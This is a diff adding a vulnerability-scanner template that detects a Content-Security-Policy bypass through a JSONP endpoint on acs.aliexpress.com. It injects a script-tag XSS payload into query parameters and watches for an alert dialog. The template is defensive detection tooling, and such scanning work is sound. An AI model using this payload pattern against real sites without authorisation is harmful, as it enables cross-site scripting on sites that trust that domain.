@@ -1,0 +1,55 @@
+id: aliexpress-acs-csp-bypass
+
+info:
+  name: Content-Security-Policy Bypass - AliExpress ACS
+  author: renniepak,DhiyaneshDK
+  severity: medium
+  reference:
+    - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
+  metadata:
+    verified: true
+  tags: xss,csp-bypass,aliexpress-acs
+
+flow: http(1) && headless(1)
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "Content-Security-Policy"
+          - "aliexpress.com"
+        condition: and
+        internal: true
+
+headless:
+  - steps:
+      - action: navigate
+        args:
+          url: "{{BaseURL}}"
+
+      - action: waitdialog
+        name: aliexpress_acs_csp_xss
+        args:
+          max-duration: 5s
+
+    payloads:
+      injection:
+        - '<script src="https://acs.aliexpress.com/h5/mtop.aliexpress.address.shipto.division.get/1.0/?type=jsonp&dataType=jsonp&callback=alert"></script>'
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{url_encode(injection)}}"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "aliexpress_acs_csp_xss == true"
+# digest: 4a0a00473045022100fa5fa04e0d6d342b8a2a9745f37314bb2befc956c119460fbb3f4964e05dddc202205de0610bbff0eb23ce4ad9424538f13010dd514d8dbcd6e2a227d5ecbd467907:922c64590222798bb761d5b6d8e72950
